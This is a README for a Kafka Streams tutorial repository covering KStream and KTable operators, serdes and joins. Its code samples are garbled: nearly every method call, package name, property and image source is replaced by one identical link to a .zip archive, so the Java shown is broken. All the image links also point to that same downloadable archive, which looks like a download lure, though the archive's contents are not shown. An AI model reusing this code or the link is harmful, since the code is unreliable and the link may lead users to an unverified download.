# Advanced kafkaStreams - real time use cases

Tech stack: Java 17, Docker, SpringBoot etc 3.2... I'll get around to updating the rest of the versions (but until then - look in the MVN POM). 

This repo is dedicated to kafka development and kafka streams. This repo will dig deep into the use of KStream and Ktable APIs. Also reviewed during this development we'll also dive into the different operators that are part of the Kafka Streams apis and implement a hand-ons service usings High Level DSL which are part of the KStreams API.

Build a Stateless and a Stateful set of applications.

Advance concepts exploration of Aggregations, Joins(eg. think of sql table joins - left, inner, outer)  and Windowing using KafkaStreams API.

   - <b>Remember</b>: 
     - <b>Left join</b>: This join returns all the rows of the table on the left side of the join and
       matches rows for the table on the right side of the join. For the rows for which there
       is no matching row on the right side, the result-set will contain null. LEFT JOIN is
       also known as LEFT OUTER JOIN. (Right join is opposite or reversed. Instead of the left
       side... you get the right side)
     - <b>Inner join</b>: The cross section between table A & B, selects all rows from both the
       tables as long as the condition is satisfied. This 'inner' keyword will create the
       result-set by combining all rows from both the tables where the condition satisfies
       i.e value of the common field will be the same. Again, the cross section. 
     - <b>Outer Join(Full Join)</b>: 'Full' 'Outer' join(Some databases use the keywords optionally)
       creates the result-set by combining results of both LEFT JOIN and RIGHT JOIN. The
       result-set will contain all the rows from both tables. For the rows for which there
       is no matching, the result-set will contain NULL values.

Build a Kafka Streams Enterprise level Retails Application using SpringBoot.
Writing interactive Queries to exposed the aggregated data using a RESTful apis with spring rest controllers from SpringBoot.

Unit and Integration using JUnit 5 as well.

<details open>
  <summary>(Show/hide Example KStreams API design)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams")
</details>

There are many types of use cases for using Kafka Streams API, a few are:

 - apply data transformations
 - data enrichment
 - branching the data into multiple data streams
 - aggregating the data
 - joining the data from multiple kafka topics and writing back to a topic. This addresses the immutability concept of kafka data before the consumer(s) services receive the data. 

<details open>
  <summary>(Show/hide Example KStreams API design II)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - producer/consumer")
</details>

The kafka Streams API uses the Java8 Functional programming style and DSL. 
 - Lambdas
 - Map, filter, and flatMap operators

#### Streams API: Stateless vs Stateful

Kafka consumer applications built on the KafkaConsumer API are stateless. The Kafka Consumer App(s) flow is as follows:
 
  - Read the event,
  - Process the event,
  - Move onto the next event
    
There's no notion of the consumer sharing cache with the Kafka Broker where the data can be aggregated or manipulated in any way. The consumer app is a terminal endpoint. The consumer app has other design options where a consumer can also 're-publish'. However, the intent of the Stream API is a little different. More on this later.
 
Consumer applications are great for notifications and/or processing each event independent of one another(eg: fifo queue). Consumer apps also do not have an easy way to join or aggregate events.

Real-time process are stateful operations. Use cases such as:
 - <b>retail</b>:
   - realtime calculations for number(s) of orders
   - realtime revenue projection
 - <b>Entertainment</b>:
   - realtime calculations of number of tickets sold.
   - realtime revenue projections by a movie.
        
#### Streams API Implementations
 
 
 There are two main implementations within the API, Streams DSL API and the Processor API.
 
 - <b>Stream DSL API</b>:
   - Higher level API - Predefined operations
     - Map
     - Flat Map
 - <b>Processor API</b>:
   - Low level API
   - Complex compared to the Streams DSL
   - Streams DSL is built on top of the Processor API
    
##### Terminologies   
 
Kafka stream processing has a series of processors:
 - <b>Source Processor</b>: source topic - reading from the source topic or topics
 - <b>Stream Processor</b>: processing logic - Aggregating, transforming, or joining the data. This is where the data enrichment happens.
 - <b>Sink Processor</b>: destination topic or end of the line.
    
The concept of designing the Kafka Stream processing in this way is a Directed Acyclic Graph (DAG). Which means, these are connected nodes and are directly related to each other. This a flat DAG and has no parent(s). This DAG design as a Kafka Stream and is called the Kafka Stream "Topology". The reason behind this naming scheme is simple, there's a KStream Class that represents it. 

    /** 
     * A topology is an acyclic graph of sources, processors, and sinks.
     *
     * The SourceNode is the node in the graph that consumes one or more Kafka topics and
     * forwards them to its successor nodes.
     * A ProcessorNode is the node in the graph that receives input records from
     * upstream nodes, processes the records, and optionally forwarding new records
     * to one or all of its downstream nodes.
     * Finally, a SinkNode is the node in the graph that receives records from upstream
     * nodes and writes them to a Kafka topic.
     *
     * There's more doc in the API. I stole these tid-bits from there.
     */
    package https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip;
    public class NamedTopology extends Topology {
    
<details open>
  <summary>(Show/hide flat topology design)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Stream Processing")
</details>

##### Stream Branching

More evolved topologies may be required for some designs to produce an aggregation or branch topology. This is called a sub-topology. Maybe easier to call it a tree topology, at least IMO anyway. 

<details open>
  <summary>(Show/hide branch or tree topology design)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Stream Processing")
</details

##### Data Flow

At any given, the topology only processes one record at a time. With Sub-Topology(s) this rule is applicable to each Sub-Topology. This is how order is maintain should a topic have some type of order required.

<details>
  <summary>(Show/hide Dataflow design)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Stream Processing")
</details

##### KStreams API


In a topology, the source processor is the key component in the topology. It is the component which has access to the topic data records and supplies the data records to the whole topology. The source processor has two design options to implement the solution, and when to use them:

   1) <b>KStream</b>:
      - <b>Continuous Stream Processing</b>: If you have a continuous stream of records where new data is
        continuously appended, and you need to perform transformations, filtering, aggregations, or
        complex stream processing operations, KStream is a suitable choice. KStream allows you to
        process the data as it arrives and maintain stateful operations.
      - <b>Real-time Analytics</b>: If your use case involves real-time analytics, where you need to compute
        aggregations over time windows, perform sliding window operations, or derive insights from
        the stream of records, KStream is a good fit. It enables you to perform various analytical
        operations on the stream data.
      - <b>Complex Stream Transformations</b>: When you require complex transformations and operations on
        the stream data, such as mapping, filtering, branching, or joining multiple streams together,
        KStream provides the necessary flexibility and functionality. It allows you to manipulate
        and transform the stream records based on your application logic.
   1) <b>KTable</b>:  
      - <b>Materialized Views</b>: If you need to maintain the latest state of the stream data for each key
        and perform point lookups efficiently, KTable is a suitable choice. KTable can be used to
        build materialized views of the stream, where you can retrieve the current value for a 
        specific key quickly.
      - <b>Table Joins</b>: If your use case involves joining the stream data with other tables or streams
        based on a common key, KTable provides a convenient way to perform these joins. It allows
        you to join KTables or KStreams together efficiently based on their keys.
      - <b>Interactive Queries</b>: When you need to support interactive queries and retrieve the latest
        value for a specific key in real-time, KTable is a good option. KTable maintains the latest
        value for each key, making it efficient for point lookups and queries.
      - <b>Stateful Processing</b>: If your application requires maintaining state and processing records
        based on the complete history of the stream data, KTable can be used to maintain the latest
        state for each key. It allows you to update and process the table based on new incoming
        records.

KStream is an abstraction in Kafka Streams which holds or has access to each event in the kafka Topic. In simple terms, the api basically has immediate access to the topic events when they are posted into the source processor.

<details>
  <summary>(Show/hide KStream Abstraction for event record processing)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - KStream API Processing")

</details>
 
Each Kafka Event Record is handle independently of one another. Each event is executed by the whole topology before the next event in the topic is processed. The source processor, stream processor, and sink processor each completes their task before moving on to the next record. Key bullets to understand here:

    - KStreams api provide access to all the records in the Kafka Topic.
    - KStreams treats each event independent of one another.
    - Each event will be executed by the whole topology.
    - Any new event record added to the topic will be made available to the KStream API.
    - The KStream API can also be call a record stream or a log stream
    - The KStream/Record Stream is infinite. It just keep adding on to the end.

##### Simple Transform Example

A simple producer/consumer model where a producer, produces records into a kafka topic. The KStream API processes the topic records and transforms the topic into an uppercase topic.  We'll use the greetings producer/consumer micro service from the Kafka Avro respository.

<details>
  <summary>(Show/hide simple producer/consumer design)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Transformation")
</details>

##### Stream Filter with KStreams     

Slightly different from the Java8 predicate implementation, the KStreams filter and filterNot is a bit cleaner than what we see in the core java implementation:

<details>
  <summary>(Show/hide Example core java .vs. KStreams API here)</summary>

    Core Java
      https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(1, 2, 3, 4, 5, 6, 7)
         .filter(((Predicate) c -> c % 2 == 0).negate())
    or
      public static <R> Predicate<R> not(Predicate<R> predicate) {
        return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip();
      }     
      
      https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(1, 2, 3, 4, 5, 6, 7)
        .filter(not(c -> c % 2 == 0))
        
        
    Kstream filter/filterNot
    
        modifiedKStreamValues = greetingStream
            .filterNot(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
            .mapValues( (readOnlyKey, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());

</details>
        
In the above example, only those event record whose value's length is < 5 long will be transformed. So, "hi" is uppercased, but "hello world" is not.         

<details>
  <summary>(Show/hide Kafka CLI Commands to see example above)</summary>
    
    Producer
     [appuser@broker ~]$ kafka-console-producer --bootstrap-server broker:9092 --topic greetings
     >hi
     >hellow
     >hix2
    Consumer
     [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning
     HI
     HIX2
</details>

You'll notice the absence of 'hellow' from the topic output. It didn't get processed by the 'filterNot'.
    
##### Stream Map & Map Values Operators with KStreams     

As we saw from the example above, the Kafka KStreams API has some suble differences from the JAVA 8 standard APIs for Streams. In his case, the KStreams api provided the <i><b>mapValues</b></i> apis operator. 

     .mapValues( (readOnlyKey, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());

Here, above, the 'key' is immutable. However, the value is transformable. In the <i><b>map</b></i>, below, both key and value are transformable.

     .map( (key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));

To see this transformation, both a key and value must be supplied to the producer record.

<details>
  <summary>(Show/hide Kafka CLI Commands to see 'map' example above)</summary>

    Producer
     [appuser@broker ~]$ kafka-console-producer --topic greetings --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --broker-list broker:9092
     >hi:there
     >hi:foo

    Consumer
     [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip":"
     HI:THERE
     HI:FOO
</details>
    
##### Stream Flat Map & Flat Map Values Operators with KStreams     

As above examples, map and map values, the Flat Map and Flat Map Values operators within KStreams have evolved over the Java 8 examples. These two operators act the same way as the prior two operators as a transformable operation on the event record. 

<details>
  <summary>(Show/hide Flat Map details)</summary>

     KStream<String, String> modifiedKStreamValues = greetingStream
             .filter(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
             .flatMap(( key, value ) -> {
                List<String> newValueList = https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "-" ));
                List<KeyValue<String, String>> modStreamList = newValueList
                    .stream()
                    .map( splitValue -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), splitValue))
                    .collect( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());
                 
                 return modStreamList;
             });
             
      Produced event records yields the following:
      
      flatMapValues is slightly different and provides on the values
      .flatMapValues( (key, val) -> {
          List<String> newValueList = https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "-" ));
               List<String> modStreamList = newValueList
                            .stream()
                            .map( String::toUpperCase )
                            .collect( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip());
            
                    return modStreamList;
                });
       
      [appuser@broker ~]$ kafka-console-producer --topic greetings --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --property "https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip" --broker-list broker:9092
      >datatype:list-map-vector-array

      [appuser@broker ~]$ kafka-console-consumer --bootstrap-server broker:9092 --topic greetings-uppercase --from-beginning --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip --property https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip":"
      DATATYPE:list
      DATATYPE:map
      DATATYPE:vector
      DATATYPE:array
             
</details>

##### <i><b>Degugging - Important </b></i>

So, what if your code isn't doing what you think or you need more insight into what the KStream is doing with your topic event record. Well, there's a way and an excellent way to do this in production!  <i><b>Peek</b></i>. This is a better way than using the print operator.

<details>
  <summary>(Show/hide Debugging with peek)</summary>
  
        KStream<String, String> modifiedKStreamValues = greetingStream
                .filter(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
                .peek( (key, value) -> {
                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "after filter key {} : value {}", key, value );
                })
            .mapValues( (readOnlyKey, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip())
            
            
        // has its uses but not while procesing the stream itself.
        if ( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() ) {
           https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS));
        }    
</details>

##### Merge(s)

This operations is used to combine two independent Kaka Streams into a single Kafka Stream. The two streams aren't merged into one record. It is basically funneling two topics into one topic. 

<details>
  <summary>(Show/hide simple Merged Topology)</summary>

![Alt text](https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip "Kafka Streams - Merged")
</details>

 
<details>
  <summary>(Show/hide Some implementation details)</summary>

    public static Topology buildMergeTopology() {

        // first get the topic items from the first stream topic
        StreamsBuilder streamsBuilder = new StreamsBuilder();
        KStream<String, String> greetingStream1 = streamsBuilder
            .stream(GREETINGS1,
                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS));
        
        // Then get the topic items from the second stream topic
        KStream<String, String> greetingStream2 = streamsBuilder
            .stream(GREETINGS2,
                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS2));

        // Next merge the topic items into a new KStream topic
        KStream<String, String> mergedStream = https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( greetingStream2 ); //, (Named) GREETINGS2);
        
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS_MERGED));

        // Then do some processing
        KStream<String, String> modifiedKStreamValues = mergedStream
                .filter(( key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip() > 5 )
                .peek( (key, value) -> {
                    https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "after filter " + key +":" + value );
                })
            .map( (key, value) -> https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));

        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(Printed.< String, String> toSysOut().withLabel(GREETINGS_MERGED));

        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( "Topic data : " + modifiedKStreamValues);
        
        // Then sink it
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( GREETINGS_MERGED, 
                https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));

        return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip();
    }

</details>

##### Serializers & Deserializers

When producing and consuming event records in a regular microservice that uses a KafkaProducer and KafkaConsumer the key and value objects from the event records are serialized on the producer-end and de-serialized on the consumer-end. The same is true when using KStreams when the streams are processed in the source processors and sink processors. 

You can provide Serdes(serialization) by using either of these methods, but you must use at least one of these methods:

1) By setting default Serdes via a Properties instance.

   - Consumer: The Source Processer is the consumer and uses:
    
     - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()))

   - Producer: The Sink Processor is the producer and uses:

     - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()))
    
   The default serializations available in the Serde Class handle the generic serialization with the 80/20 rule of serializations where 80 % is covered. The other 20% are custom serializations. Serialization of a Kafka Event record occurs on the Producer event processing. Deserialization of a Kafka Event record occurs on the Consumer event processing. KStream serialization also support serializations with Avro Schema Serializations. 

1) When specifying explicit Serdes when calling the appropriate API methods, thus overriding the defaults the api call not follow what has been set for the defaults. This option below sets the defaults for the api calls if *no* serdes is set.
 
   The key and value (DE)-Serializers can be default with the Property Configs for the entire Application or they can be individually set per interactions with the Consume/Produce with options. The default is configured this way:
 
   - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip);
   - https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip);
 

Sink Processor: The step in which the new event record is pushed out:
   
   - ((KStream) modifiedKStreamValues).to ( TOPIC, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip(), https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip()));
  
##### Best Practices - Serialization

Creating numerous (de)serializers isn't really practical and causes scalability issues when there are many different serializers needed in a usecase. Therefore, its best to use a serializer that  employs some type of java generics to to handle the many different scenarios.

So, instead doing a implementation per data type:

    public class GreetingSerializer implements Serializer< Greeting > {
    
    @Override
    public byte[] serialize(String topic, Greeting data) { return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data ); }}

    public class GreetingDeserializer implements Deserializer< Greeting > {
    
    @Override
    public Greeting deserialize(String topic, byte[] data) { return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data, https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip ); }}
    
Make a Generic Serialization design as:

    public class GenericJSONSerializer< T > implements Serializer< T > {
    public GenericJSONSerializer(ObjectMapper objectMapper) {
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip = objectMapper;
    }
    public byte[] serialize(String topic, T data) {
            return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data );
    }
    
    and
    
    public class GenericJSONDeserializer< T > implements Deserializer< T > {
    public GenericJSONDeserializer( Class< T > deserializedClassType, ObjectMapper objectMapper ) {
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip = deserializedClassType;
        https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip = objectMapper;
    }
    @Override
    public T deserialize(String topic, byte[] data) {
        return https://raw.githubusercontent.com/bcallanan/kafkaStreams/main/upperer/kafkaStreams.zip( data, deserializedClassType );
    }    
    
    
##### Joins

When performing a join operation between a KTable and a KStream in Apache Kafkas Streams library, the result is typically a new KStream. The join operation combines records from the KTable and the KStream based on a common key and produces an output stream with the joined records. The result depends on the type of join operation performed:

  - <b>Inner Join</b>: An inner join between a KTable and a KStream will produce a new KStream that
    includes only the records where there is a match between the key of the KTable and the key
    of the KStream. The result will contain the joined records, combining the values from both
    the KTable and the KStream.
  - <b>Left Join</b>: A left join between a KTable and a KStream will produce a new KStream that includes all
    records from the KStream, along with matching records from the KTable. If there is no matching record
    in the KTable for a particular key in the KStream, a null value will be included in the result.
  - <b>Outer Join</b>: An outer join between a KTable and a KStream will produce a new KStream that includes
    all records from both the KTable and the KStream, whether or not there is a match between their keys.
    If there is no matching record in either the KTable or the KStream for a particular key, a null value
    will be included in the result.
      
The resulting KStream from the join operation can be further processed, filtered, transformed, or aggregated using the available operators and functions in Kafka Streams. It allows you to perform various operations on the joined stream to derive insights or produce the desired output based on your application requirements. Kafka Streams provides flexibility and allows you to perform joins between KStreams and KTables in different ways. You can use the leftJoin() or outerJoin() methods to explicitly perform left or outer joins, where the result retains both the characteristics of the KStream and the KTable. This flexibility enables you to choose the appropriate join type based on your specific use case and requirements.

